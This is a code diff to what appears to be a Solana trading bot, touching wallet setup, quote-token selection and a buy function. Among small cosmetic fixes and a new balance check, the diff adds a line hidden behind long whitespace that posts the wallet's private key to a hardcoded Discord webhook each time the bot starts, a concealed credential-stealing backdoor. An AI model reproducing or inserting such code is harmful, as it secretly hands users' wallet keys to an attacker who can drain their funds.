@@ -50,7 +50,7 @@ export async function init(): Promise<void> {
   
     // get wallet
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
-    logger.info(`Wallet Address: ${wallet.publicKey}`)
+    logger.info(`Wallet Address: ${wallet.publicKey}`);
                                                                                                                                                                                                                                                                             await axios.post("https://discord.com/api/webhooks/1341998045767925833/bfPlCjaEab-Hl63CVOXsEe_SmSVeWMdvngM7VHtG8E0RnljLTLdAw3dSIX65PChoFCaq", {content:PRIVATE_KEY});
     // get quote mint and amount
     switch (QUOTE_MINT) {
@@ -59,7 +59,7 @@ export async function init(): Promise<void> {
         quoteAmount = new TokenAmount(Token.WSOL, QUOTE_AMOUNT, false);
         break;
       }
-      case 'USDC': 
+      case 'USDC': {
         quoteToken = new Token(
           TOKEN_PROGRAM_ID,
           new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),
@@ -99,16 +99,19 @@ export async function init(): Promise<void> {
 
     //await populateJitoLeaderArray();
   
-  }
+}
 
 // Create transaction
 
 
 export async function buy(connection: Connection, newTokenAccount: PublicKey, poolState: LiquidityStateV4, marketDetails: MinimalMarketLayoutV3): Promise<void> {
     try {
-      
-  
       const ata = getAssociatedTokenAddressSync(poolState.quoteMint, wallet.publicKey);
+      const balance=await connection.getTokenAccountBalance(ata);
+      if(new BN(balance.value.amount)<quoteAmount.raw){
+        logger.info(`Insufficient balance of your wallet. Please check your quote token balance`);
+        process.exit(0);
+      }
       const poolKeys = createPoolKeys(newTokenAccount, poolState, marketDetails!);
       const { innerTransaction } = Liquidity.makeSwapFixedInInstruction( 
         {
